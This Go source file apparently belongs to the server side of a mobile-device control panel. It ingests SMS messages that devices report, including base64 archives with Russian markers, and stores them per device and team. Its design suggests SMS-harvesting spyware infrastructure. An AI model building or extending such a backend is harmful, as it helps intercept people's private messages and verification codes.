package api

import (
	"encoding/base64"
	"encoding/json"
	"regexp"
	"strings"

	"redwing/internal/db"
)

func parseSMSResult(deviceID, teamID string, resultData []byte) {
	var result any
	if json.Unmarshal(resultData, &result) != nil {
		return
	}

	var smsList []map[string]any

	switch v := result.(type) {
	case []any:
		for _, item := range v {
			if m, ok := item.(map[string]any); ok {
				smsList = append(smsList, m)
			}
		}
	case map[string]any:
		if archiveB64, ok := v["sms_archive_file"].(string); ok && archiveB64 != "" {
			smsList = parseBase64Archive(archiveB64)
		} else {
			for _, key := range []string{"messages", "sms", "sms_list", "data"} {
				if msgs, ok := v[key].([]any); ok {
					for _, item := range msgs {
						if m, ok := item.(map[string]any); ok {
							smsList = append(smsList, m)
						}
					}
					break
				}
			}
		}
	}

	for _, sms := range smsList {
		sender := smsField(sms, "from", "sender", "address", "number")
		body := smsField(sms, "body", "text", "message", "content")
		if body == "" {
			continue
		}
		if sender == "" {
			sender = "Unknown"
		}
		smsType := smsField(sms, "type")
		if smsType == "" {
			smsType = "incoming"
		}

		var exists int
		db.DB.QueryRow(
			"SELECT COUNT(*) FROM sms WHERE device_id = ? AND team_id = ? AND sender = ? AND body = ?",
			deviceID, teamID, sender, body,
		).Scan(&exists)
		if exists > 0 {
			continue
		}

		db.DB.Exec(
			"INSERT INTO sms (device_id, team_id, sender, body, sms_type) VALUES (?, ?, ?, ?, ?)",
			deviceID, teamID, sender, body, smsType,
		)
	}
}

var (
	rePhone = regexp.MustCompile(`👤\s*(.+)`)
	reDate  = regexp.MustCompile(`🕐\s*(.+)`)
)

func parseBase64Archive(b64 string) []map[string]any {
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		raw, err = base64.RawStdEncoding.DecodeString(b64)
		if err != nil {
			return nil
		}
	}
	text := string(raw)
	text = strings.TrimPrefix(text, "\xef\xbb\xbf")

	sections := regexp.MustCompile(`(?m)^[─]{10,}`).Split(text, -1)

	var result []map[string]any
	for i := 0; i < len(sections)-1; i++ {
		header := strings.TrimSpace(sections[i])
		if !strings.Contains(header, "👤") {
			continue
		}

		var body string
		if i+1 < len(sections) {
			body = strings.TrimSpace(sections[i+1])
		}

		phoneParts := rePhone.FindStringSubmatch(header)
		dateParts := reDate.FindStringSubmatch(header)

		phone := "Unknown"
		if len(phoneParts) > 1 {
			phone = strings.TrimSpace(phoneParts[1])
		}
		dateStr := ""
		if len(dateParts) > 1 {
			dateStr = strings.TrimSpace(dateParts[1])
		}

		bodyClean := cleanArchiveBody(body)
		if bodyClean == "" {
			continue
		}

		sms := map[string]any{
			"from": phone,
			"body": bodyClean,
			"type": "incoming",
		}
		if dateStr != "" {
			sms["date"] = dateStr
		}

		result = append(result, sms)
	}

	return result
}

func cleanArchiveBody(s string) string {
	lines := strings.Split(s, "\n")
	var clean []string
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.HasPrefix(trimmed, "═") || strings.HasPrefix(trimmed, "─") {
			break
		}
		if strings.Contains(trimmed, "КОНЕЦ АРХИВА") || strings.Contains(trimmed, "END OF ARCHIVE") {
			break
		}
		clean = append(clean, trimmed)
	}
	return strings.Join(clean, "\n")
}

func smsField(m map[string]any, keys ...string) string {
	for _, k := range keys {
		if v, ok := m[k].(string); ok && v != "" {
			return v
		}
	}
	return ""
}
